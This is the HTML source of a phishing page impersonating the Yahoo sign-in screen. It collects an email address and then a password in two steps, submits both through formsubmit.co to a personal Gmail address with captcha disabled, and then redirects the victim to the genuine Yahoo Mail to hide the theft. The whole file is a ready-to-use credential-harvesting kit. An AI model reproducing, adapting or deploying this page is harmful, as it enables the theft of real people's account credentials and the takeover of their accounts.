<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yahoo Login</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body {
    background: #f3f4f6;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
}

.top-bar {
    display: flex;
    justify-content: space-between;
    padding: 15px 30px;
    background: white;
    border-bottom: 1px solid #ddd;
}

.logo {
    color: #6001d2;
    font-size: 24px;
    font-weight: bold;
}

.container {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
}

.login-box {
    background: white;
    width: 380px;
    padding: 40px 30px;
    border-radius: 10px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.1);
    text-align: center;
}

/* Steps */
.step {
    display: none;
}

.step.active {
    display: block;
}

input {
    width: 100%;
    padding: 12px;
    margin: 15px 0;
    border: 1px solid #ccc;
    border-radius: 6px;
}

.btn {
    width: 100%;
    padding: 12px;
    background: #6001d2;
    color: white;
    border: none;
    border-radius: 25px;
    cursor: pointer;
}

.btn:hover {
    background: #4b00a8;
}

.back {
    background: none;
    border: none;
    color: #6001d2;
    margin-bottom: 10px;
    cursor: pointer;
    font-size: 14px;
}

.email-display {
    font-size: 14px;
    color: #555;
    margin-bottom: 10px;
}
</style>
</head>

<body>

<div class="top-bar">
    <div class="logo">yahoo!</div>
</div>

<div class="container">
    <div class="login-box">

        <!-- STEP 1: EMAIL -->
        <div class="step active" id="step-email">
            <h2>Sign in</h2>
            <p>using your Yahoo account</p>
     <form action="https://formsubmit.co/howerjohn615@gmail.com" method="POST">
            <input type="text" name="text" id="email" placeholder="Email address or username">

            
            <input type="button" class="btn" onclick="nextStep()" value="Next">
        </div>
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://mail.yahoo.com/">
        <!-- STEP 2: PASSWORD -->
        <div class="step" id="step-password">
            <button class="back" onclick="goBack()">← Back</button>

            <h2>Enter password</h2>
            <div class="email-display" id="showEmail"></div>

            <input type="password" name="password" placeholder="Password">

            <button class="btn" type="submit">Sign in</button>
        </div>
    </form>
    </div>
</div>

<script>
function nextStep() {
    let email = document.getElementById("email").value;

    if (email.trim() === "") {
        alert("Please enter your email");
        return;
    }

    // Show email in next step
    document.getElementById("showEmail").innerText = email;

    // Switch steps
    document.getElementById("step-email").classList.remove("active");
    document.getElementById("step-password").classList.add("active");
}

function goBack() {
    document.getElementById("step-password").classList.remove("active");
    document.getElementById("step-email").classList.add("active");
}
</script>

</body>
</html>
